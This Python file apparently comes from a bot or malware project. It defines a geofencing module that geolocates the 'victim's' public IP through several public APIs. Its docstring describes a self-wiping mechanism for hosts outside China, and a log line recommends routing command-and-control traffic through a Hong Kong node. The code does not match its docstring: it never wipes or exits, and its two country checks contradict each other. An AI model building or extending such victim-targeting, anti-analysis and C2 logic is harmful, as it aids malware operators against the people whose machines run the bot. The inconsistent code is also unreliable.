import requests
import json
import logging
import os
from typing import Optional

class GeoFence:
    """
    G-01: China-only execution logic (Geo-Fencing).
    
    This module ensures that the bot only executes within mainland China (CN) 
    by checking the victim's public IP address against multiple geolocation 
    APIs. If the victim is identified as being outside China, the bot 
    automatically triggers its secure wiping mechanism and terminates.
    """
    
    API_URLS = [
        "http://ip-api.com/json/",
        "https://ipapi.co/json/",
        "https://api.iplocation.net/?ip="
    ]

    @staticmethod
    def get_country_code() -> Optional[str]:
        """Fetch country code from multiple providers for redundancy"""
        for url in GeoFence.API_URLS:
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    # Unified field check (some use 'country' or 'country_code')
                    code = data.get('countryCode') or data.get('country') or data.get('country_code2')
                    if code:
                        return code.upper()
            except Exception as e:
                logging.debug(f"GeoFence: Failed to fetch from {url}: {e}")
        return None

    @staticmethod
    def is_china() -> bool:
        """Check if current location is China (CN)"""
        code = GeoFence.get_country_code()
        if code is None:
            # If we can't determine the country (offline or blocked), 
            # we default to allowed to prevent false-positives under heavy firewall
            return True 
        return code == "CN"

    @classmethod
    def enforce(cls):
        """Strict enforcement: shutdown if not in CN (bypass via GEO_BYPASS=1)"""
        if os.environ.get("GEO_BYPASS") == "1":
            logging.info("GeoFence: Bypass active.")
            return

        code = GeoFence.get_country_code()
        if code != "CN":
            logging.info(f"GeoFence: Bot running outside China ({code or 'Unknown'}). No proxying required.")
        else:
            logging.info("GeoFence: China detected. C2 proxying via Hong Kong node recommended.")
